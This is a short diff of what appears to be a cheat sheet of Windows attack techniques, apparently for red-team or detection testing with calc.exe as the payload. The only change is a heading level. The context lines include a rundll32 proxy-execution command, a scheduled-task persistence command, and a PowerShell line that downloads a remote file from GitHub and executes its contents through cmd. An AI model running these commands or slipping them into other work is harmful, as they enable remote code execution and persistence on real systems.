@@ -32,5 +32,5 @@ rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\System32\calc.exe
 ## Task Scheduler
 schtasks /Create /F /SC MINUTE /MO 3 /ST 11:50 /TN CalcLocalTask /TR "calc.exe"
 
-### Download and Execute Script
+## Download and Execute Script
 (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/losttroll/runcalc/main/nothingtoseehere.txt') | Out-File eula.txt; cmd /c $(type .\eula.txt)
